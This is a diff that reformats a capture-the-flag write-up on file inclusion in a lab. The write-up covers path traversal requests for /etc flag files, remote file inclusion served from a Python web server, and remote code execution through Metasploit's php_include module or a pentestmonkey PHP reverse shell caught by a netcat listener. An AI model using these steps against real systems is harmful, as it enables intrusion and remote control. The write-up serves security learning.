@@ -32,7 +32,9 @@ The page reads "The Input form is broken! You need to send **'POST'** request wi
 
 In this instance I will use Curl to generate the POST request and receive the flag. Open your terminal either on your VM or in the AttackBox using CTRL+ALT+T and input the below command 
 
-```curl http://MACHINE_IP/challenges/chall1.php -d "file=../../../../etc/flag1" ```  
+```bash
+curl http://MACHINE_IP/challenges/chall1.php -d "file=../../../../etc/flag1"
+```  
 #### ⚙️ **Options**  
 **-d** is used to set the data to send, in this case ```file=../../../../etc/flag1``` using the -d flag will default the request into a POST request.  
   
@@ -82,7 +84,9 @@ After some trial and error, I was still not able to find any success with the we
 I first attempted a Curl request like what we used in Task 1  ```curl http://MACHINE_IP/challenges/chall1.php -d "file=../../../../etc/flag3%00" ```     
 Which returned an error messaged indicating that the output needed to be passed to a file, as such I modified my input to output the returned data into a file using the below.  
 
-```curl http://MACHINE_IP/challenges/chall1.php -d "file=../../../../etc/flag3%00" -o file.txt```  
+```bash
+curl http://MACHINE_IP/challenges/chall1.php -d "file=../../../../etc/flag3%00" -o file.txt
+```  
 #### ⚙️ **Options**    
 **-d** is used to set the data to send with the POST request in this case ```file=../../../../etc/flag3%00``` using the -d flag will default the request into a POST request.  
 **-o** is used to output the returned result into a file of the specified name and type.  
@@ -91,7 +95,10 @@ You should end up with something like the below
 ![lab3 curl](./Images/lab3_curl.png)  
 I did use -X and -d which I later learnt was not required and only -d was needed.  
   
-Once the data has been returned, we can then open our created file using ```cat file.txt```  
+Once the data has been returned, we can then open our created file using 
+```bash
+cat file.txt
+```  
 This will return the below with the required flag for task 3.  
 ![lab3_flag](./Images/lab3_flag.png)  
 
@@ -101,11 +108,17 @@ This will return the below with the required flag for task 3.
 ## 🛠️ TASK 4: Gain RCE in Lab #Playground and find the hostname
 As mentioned in the top summary I will demonstrate two different methods to gain RCE access to this lab one via Metasploit and one by loading a TCP Reverse Shell manually.  
 But first lets to a quick manual test to verify the RFI vulnerability is present, before we work on obtaining RCE access.    
-Open your terminal and input ```echo "Hello World" > test.php``` This will create a .PHP file with "Hello World"  
+Open your terminal and input 
+```bash
+echo "Hello World" > test.php
+```
+This will create a .PHP file with "Hello World"  
 ![lab4_hello_world](./Images/lab4_hello_world.png)  
 
 Next, we need to setup a http server in the same directory as our file which will be used to download the file onto the target. We can do this via the below  
-```python3 -m http.server 8080```  
+```bash
+python3 -m http.server 8080
+```  
 #### ⚙️ **Options**  
 **-m** option is used to tell python to search for and run a specific module in this instance the http.server module.  
 
@@ -125,10 +138,20 @@ This confirms there is a RFI vulnerability which we can exploit to gain RCE acce
 
 ### 🔥 Metasploit option  
 For this method we will use the PHP_Include metasploit module to gain RCE access.  
-Open up metasploit using ```mfsconsole```  
-Once Metasploit has started we will load our module using ```use exploit/unix/webapp/php_include```  
+Open up metasploit using 
+```bash
+mfsconsole
+```  
+Once Metasploit has started we will load our module using 
+```console
+use exploit/unix/webapp/php_include
+```  
 This will default set our payload to a php/meterpreter/reverse_tcp which will be sufficient for our use case.  
-Next type in ```show options``` which will bring up the different payload options. We will need to configure some options to enable this attack.  
+Next type in 
+```console
+show options
+```
+Which will bring up the different payload options. We will need to configure some options to enable this attack.  
 ![lab4_mfs_options](./Images/lab4_mfs_options.png)  
 
 #### ⚙️ **Options**  
@@ -146,13 +169,25 @@ Now we and run the exploit be using either ```run``` or ```exploit```
 If successful we should see a meterpreter session has been created.  
 ![lab4_shell_success](./Images/lab4_shell_success.png)  
 
-Now we can spawn a bash shell and retrieve the flag. Type in ```shell -b``` to spawn a bash shell and the input ```hostname``` to retrieve our flag.  
+Now we can spawn a bash shell and retrieve the flag. Type in 
+```console
+shell -b
+``` 
+to spawn a bash shell and the input 
+```bash
+hostname
+``` 
+To retrieve our flag.  
 ![lab4_flag](./Images/lab4_flag.png)  
 
 ### 👨‍💻 Manual shell option  
 Here I will demonstrate another method to gain RCE access without using Metasploit. Firstly, we will need to find a payload to use and my go to is the Reverse PHP Payload which can be found here: [https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)  
 
-Let’s open a blank file on our machine with your preferred text editor. I will use nano so I will input ```nano rce.php``` into my terminal to open a new blank file. One you have the file opened copy and paste the entire payload code linked in the above github repository. Once copied into our file we will need to configure a couple of items.  
+Let’s open a blank file on our machine with your preferred text editor. I will use nano so I will input 
+```bash
+nano rce.php
+``` 
+Into the terminal to open a new blank file. One you have the file opened copy and paste the entire payload code linked in the above github repository. Once copied into our file we will need to configure a couple of items.  
 
 #### ⚙️ **Options**  
 Find the line starting with ```$ip```  
@@ -163,7 +198,11 @@ This should look similar to the below.
 ![flag4_shell](./Images/flag4_shell.png)  
 
 Save the file and if needed move into the directory of the file as we will need to start a http server to serve the file to the web server.  
-To start a http server input ```python3 -m http.server 5050``` this port is not the same port as in the payload options we set above.  
+To start a http server input 
+```bash
+python3 -m http.server 5050
+```
+This port is not the same port as in the payload options we set above.  
 #### ⚙️ **Options**  
 -m option is used to tell python to search for and run a specific module in this instance the http.server module.  
 
@@ -171,7 +210,11 @@ This should look like the below.
 ![lab4_5050_server](./Images/lab4_5050_server.png)  
 
 Now let’s setup our listener using netcat. This is where the payload will call back to and spawn our shell.  
-Input ```nc -lnvp 8080``` into your terminal. The port here should match your payload port setup.  
+Input 
+```bash
+nc -lnvp 8080
+```
+Into the terminal. The port here should match your payload port setup.  
 #### ⚙️ **Options**  
 **-l** Sets netcat into listen mode.  
 **-n** Sets netcat to numeric IP address only mode.  
@@ -192,7 +235,11 @@ Which should look like the below
 If successful we should see a GET request was received by our http server.  
 ![lab4_http_server_manual](./Images/lab4_http_server_manual.png)  
 
-Our listener should have received the reverse connection. If successful we can see the hostname in the initial connection details or type in ```hostname``` to capture our flag.
+Our listener should have received the reverse connection. If successful we can see the hostname in the initial connection details or type in 
+```bash
+hostname
+``` 
+To capture the flag.
 ![lab4_flag_manual](./Images/lab4_flag_manual.png)
 
 ---
